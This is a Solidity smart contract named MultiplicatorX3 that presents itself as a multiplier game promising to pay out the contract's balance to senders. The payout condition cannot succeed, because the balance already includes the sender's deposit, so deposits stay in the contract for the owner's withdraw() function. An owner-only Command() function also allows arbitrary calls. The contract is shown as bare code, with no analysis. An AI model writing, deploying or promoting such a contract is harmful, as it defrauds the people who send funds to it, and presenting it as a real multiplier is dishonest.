pragma solidity ^0.8.26;

contract MultiplicatorX3 {
    address public Owner = msg.sender;
    uint public totalMultiplications;
    uint public totalWithdrawals;
    mapping(address => uint) public userMultiplications;
    
    event Multiplication(address indexed user, uint amount, bool success);
    event Withdrawal(address indexed owner, uint amount);

    receive() external payable {}

    function withdraw() public payable {
        require(msg.sender == Owner);
        uint balance = address(this).balance;
        payable(Owner).transfer(balance);
        totalWithdrawals++;
        emit Withdrawal(msg.sender, balance);
    }

    function Command(address adr, bytes memory data) public payable {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= address(this).balance) {
            payable(adr).transfer(address(this).balance + msg.value);
            totalMultiplications++;
            userMultiplications[adr]++;
            emit Multiplication(adr, msg.value, true);
        } else {
            emit Multiplication(adr, msg.value, false);
        }
    }
}